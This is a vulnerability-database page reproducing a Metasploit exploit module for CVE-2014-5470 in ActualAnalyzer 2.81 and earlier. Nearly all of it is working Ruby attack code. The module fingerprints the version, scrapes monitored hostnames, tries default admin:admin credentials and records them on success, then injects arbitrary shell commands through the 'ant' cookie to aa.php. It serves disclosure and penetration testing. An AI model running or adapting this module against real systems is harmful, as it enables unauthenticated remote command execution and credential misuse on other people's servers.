
[![Vulmon Logo](/assets/imgs/logo.png)
Vulmon](/)
[Recent Vulnerabilities](/searchpage?q=*&sortby=bydate)
[Product List](/productlist)
[Research Posts](/researchposts)
[Trends](/trends)
[Blog](https://blog.vulmon.com/)
[About](/about)
[Contact](/contact)

Vulmon Alerts

By Relevance

By Risk Score

By Publish Date

# ActualAnalyzer - 'ant' Cookie Command Execution (Metasploit)

**Related Vulnerabilities:**
[CVE-2014-5470](vulnerabilitydetails?qid=CVE-2014-5470&scoretype=cvssv3)
**Publish Date:** 16 Dec 2014
**Author:** [Metasploit](searchpage?q=Metasploit)
[Source](https://www.exploit-db.com/exploits/35549/) / [Download Exploit](https://www.exploit-db.com/download/35549)

```

                ##
# This module requires Metasploit: http://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'msf/core'

class Metasploit3 &lt; Msf::Exploit::Remote
  Rank = ExcellentRanking

  include Msf::Exploit::Remote::HttpClient

  def initialize(info = {})
    super(update_info(
      info,
      'Name'            =&gt; "ActualAnalyzer 'ant' Cookie Command Execution",
      'Description'     =&gt; %q{
        This module exploits a command execution vulnerability in
        ActualAnalyzer version 2.81 and prior.

        The 'aa.php' file allows unauthenticated users to
        execute arbitrary commands in the 'ant' cookie.
      },
      'License'         =&gt; MSF_LICENSE,
      'Author'          =&gt;
        [
          'Benjamin Harris', # Discovery and exploit
          'Brendan Coles &lt;bcoles[at]gmail.com&gt;' # Metasploit
        ],
      'References'      =&gt;
        [
          ['EDB', '34450'],
          ['OSVDB', '110601']
        ],
      'Payload'         =&gt;
        {
          'Space'       =&gt; 4096, # HTTP cookie
          'DisableNops' =&gt; true,
          'BadChars'    =&gt; "\x00"
        },
      'Arch'            =&gt; ARCH_CMD,
      'Platform'        =&gt; 'unix',
      'Targets'         =&gt;
        [
          # Tested on ActualAnalyzer versions 2.81 and 2.75 on Ubuntu
          ['ActualAnalyzer &lt;= 2.81', { 'auto' =&gt; true }]
        ],
      'Privileged'      =&gt; false,
      'DisclosureDate'  =&gt; 'Aug 28 2014',
      'DefaultTarget'   =&gt; 0))

    register_options(
      [
        OptString.new('TARGETURI', [true, 'The base path to ActualAnalyzer', '/lite/']),
        OptString.new('USERNAME', [false, 'The username for ActualAnalyzer', 'admin']),
        OptString.new('PASSWORD', [false, 'The password for ActualAnalyzer', 'admin']),
        OptString.new('ANALYZER_HOST', [false, 'A hostname or IP monitored by ActualAnalyzer', ''])
      ], self.class)
  end

  #
  # Checks if target is running ActualAnalyzer &lt;= 2.81
  #
  def check
    # check for aa.php
    res = send_request_raw('uri' =&gt; normalize_uri(target_uri.path, 'aa.php'))
    if !res
      vprint_error("#{peer} - Connection failed")
      return Exploit::CheckCode::Unknown
    elsif res.code == 404
      vprint_error("#{peer} - Could not find aa.php")
      return Exploit::CheckCode::Safe
    elsif res.code == 200 &amp;&amp; res.body =~ /ActualAnalyzer Lite/ &amp;&amp; res.body =~ /Admin area&lt;\/title&gt;/
      vprint_error("#{peer} - ActualAnalyzer is not installed. Try installing first.")
      return Exploit::CheckCode::Detected
    end
    # check version
    res = send_request_raw('uri' =&gt; normalize_uri(target_uri.path, 'view.php'))
    if !res
      vprint_error("#{peer} - Connection failed")
      return Exploit::CheckCode::Unknown
    elsif res.code == 200 &amp;&amp; /title="ActualAnalyzer Lite \(free\) (?&lt;version&gt;[\d\.]+)"/ =~ res.body
      vprint_status("#{peer} - Found version: #{version}")
      if Gem::Version.new(version) &lt;= Gem::Version.new('2.81')
        report_vuln(
          host: rhost,
          name: self.name,
          info: "Module #{fullname} detected ActualAnalyzer #{version}",
          refs: references,
        )
        return Exploit::CheckCode::Vulnerable
      end
      return Exploit::CheckCode::Detected
    elsif res.code == 200 &amp;&amp; res.body =~ /ActualAnalyzer Lite/
      return Exploit::CheckCode::Detected
    end
    Exploit::CheckCode::Safe
  end

  #
  # Try to retrieve a valid analytics host from view.php unauthenticated
  #
  def get_analytics_host_view
    analytics_host = nil
    res = send_request_cgi(
      'method' =&gt; 'POST',
      'uri' =&gt; normalize_uri(target_uri.path, 'view.php'),
      'vars_post' =&gt; {
        'id_h' =&gt; '',
        'listp' =&gt; '',
        'act_h' =&gt; 'vis_int',
        'oldact' =&gt; 'vis_grpg',
        'tint_h' =&gt; '',
        'extact_h' =&gt; '',
        'home_pos' =&gt; '',
        'act' =&gt; 'vis_grpg',
        'tint' =&gt; 'total',
        'grpg' =&gt; '201',
        'cp_vst' =&gt; 'on',
        'cp_hst' =&gt; 'on',
        'cp_htst' =&gt; 'on',
        'cp_reps' =&gt; 'y',
        'tab_sort' =&gt; '1_1'
      }
    )
    if !res
      vprint_error("#{peer} - Connection failed")
    elsif /&lt;option value="?[\d]+"?[^&gt;]*&gt;Page: https?:\/\/(?&lt;analytics_host&gt;[^\/^&lt;]+)/ =~ res.body
      vprint_good("#{peer} - Found analytics host: #{analytics_host}")
      return analytics_host
    else
      vprint_status("#{peer} - Could not find any hosts on view.php")
    end
    nil
  end

  #
  # Try to retrieve a valid analytics host from code.php unauthenticated
  #
  def get_analytics_host_code
    analytics_host = nil
    res = send_request_cgi(
      'uri' =&gt; normalize_uri(target_uri.path, 'code.php'),
      'vars_get' =&gt; {
        'pid' =&gt; '1'
      }
    )
    if !res
      vprint_error("#{peer} - Connection failed")
    elsif res.code == 200 &amp;&amp; /alt='ActualAnalyzer' src='https?:\/\/(?&lt;analytics_host&gt;[^\/^']+)/ =~ res.body
      vprint_good("#{peer} - Found analytics host: #{analytics_host}")
      return analytics_host
    else
      vprint_status("#{peer} - Could not find any hosts on code.php")
    end
    nil
  end

  #
  # Try to retrieve a valid analytics host from admin.php with creds
  #
  def get_analytics_host_admin
    analytics_host = nil
    user = datastore['USERNAME']
    pass = datastore['PASSWORD']
    res = send_request_cgi(
      'method' =&gt; 'POST',
      'uri' =&gt; normalize_uri(target_uri.path, 'admin.php'),
      'vars_post' =&gt; {
        'uname' =&gt; user,
        'passw' =&gt; pass,
        'id_h' =&gt; '',
        'listp' =&gt; '',
        'act_h' =&gt; '',
        'oldact' =&gt; 'pages',
        'tint_h' =&gt; '',
        'extact_h' =&gt; '',
        'param_h' =&gt; '',
        'param2_h' =&gt; '',
        'home_pos' =&gt; '',
        'act' =&gt; 'dynhtml',
        'set.x' =&gt; '11',
        'set.y' =&gt; '11'
      }
    )
    if !res
      vprint_error("#{peer} - Connection failed")
    elsif res.code == 200 &amp;&amp; res.body =~ /&gt;Login&lt;/
      vprint_status("#{peer} - Login failed.")
    elsif res.code == 200 &amp;&amp; /alt='ActualAnalyzer' src='https?:\/\/(?&lt;analytics_host&gt;[^\/^']+)/ =~ res.body
      vprint_good("#{peer} - Found analytics host: #{analytics_host}")
      print_good("#{peer} - Login successful! (#{user}:#{pass})")
      service_data = {
        address: Rex::Socket.getaddress(rhost, true),
        port: rport,
        service_name: (ssl ? 'https' : 'http'),
        protocol: 'tcp',
        workspace_id: myworkspace_id
      }
      credential_data = {
        origin_type: :service,
        module_fullname: fullname,
        private_type: :password,
        private_data: pass,
        username: user
      }
      credential_data.merge!(service_data)
      credential_core = create_credential(credential_data)
      login_data = {
        core: credential_core,
        last_attempted_at: DateTime.now,
        status: Metasploit::Model::Login::Status::SUCCESSFUL
      }
      login_data.merge!(service_data)
      create_credential_login(login_data)
      return analytics_host
    else
      vprint_status("#{peer} - Could not find any hosts on admin.php")
    end
    nil
  end

  def execute_command(cmd, opts = { analytics_host: vhost })
    vuln_cookies = %w(anw anm)
    res = send_request_cgi(
      'uri' =&gt; normalize_uri(target_uri.path, 'aa.php'),
      'vars_get' =&gt; { 'anp' =&gt; opts[:analytics_host] },
      'cookie' =&gt; "ant=#{cmd}; #{vuln_cookies.sample}=#{rand(100...999)}.`$cot`"
    )
    if !res
      fail_with(Failure::TimeoutExpired, "#{peer} - Connection timed out")
    elsif res.code == 302 &amp;&amp; res.headers['Content-Type'] =~ /image/
      print_good("#{peer} - Payload sent successfully")
      return true
    elsif res.code == 302 &amp;&amp; res.headers['Location'] =~ /error\.gif/
      vprint_status("#{peer} - Host '#{opts[:analytics_host]}' is not monitored by ActualAnalyzer.")
    elsif res.code == 200 &amp;&amp; res.body =~ /Admin area&lt;\/title&gt;/
      fail_with(Failure::Unknown, "#{peer} - ActualAnalyzer is not installed. Try installing first.")
    else
      fail_with(Failure::Unknown, "#{peer} - Something went wrong")
    end
    nil
  end

  def exploit
    return unless check == Exploit::CheckCode::Vulnerable
    analytics_hosts = []
    if datastore['ANALYZER_HOST'].blank?
      analytics_hosts &lt;&lt; get_analytics_host_code
      analytics_hosts &lt;&lt; get_analytics_host_view
      analytics_hosts &lt;&lt; get_analytics_host_admin
      analytics_hosts &lt;&lt; vhost
      analytics_hosts &lt;&lt; '127.0.0.1'
      analytics_hosts &lt;&lt; 'localhost'
    else
      analytics_hosts &lt;&lt; datastore['ANALYZER_HOST']
    end
    analytics_hosts.uniq.each do |host|
      next if host.nil?
      vprint_status("#{peer} - Trying hostname '#{host}' - Sending payload (#{payload.encoded.length} bytes)...")
      break if execute_command(payload.encoded, analytics_host: host)
    end
  end
end

```

#### Vulmon Search

Vulmon Search is a vulnerability search engine. It gives comprehensive vulnerability information through a very simple user interface.

#### About

[Home](/)
[Recent Vulnerabilities](/searchpage?q=*&sortby=bydate)
[Product List](/productlist)
[Vendor List](/vendorlist)
[Research Posts](/researchposts)
[Trends](/trends)
[Blog](https://blog.vulmon.com/)
[About](/about)
[Contact](/contact)

#### Products

[Vulmon Search](https://vulmon.com)
[Vulmon Research](https://research.vulmon.com)
[Vulmon Alerts](https://alerts.vulmon.com)
[Vulmap](https://github.com/vulmon/Vulmap)

#### Connect

[Twitter](https://twitter.com/vulmoncom)
[Reddit](https://www.reddit.com/r/vulnintel/)
[Linkedin](https://linkedin.com/company/vulmon)
[Facebook](https://www.facebook.com/VulmonCom/)

[![Vulmon Logo](/assets/imgs/logo.png)

Vulnerability Notification Service
You don’t have to wait for vulnerability
scanning results

Get Started](https://alerts.vulmon.com/?utm_source=vulmon.com&utm_medium=master_bottom&utm_campaign=2104021)

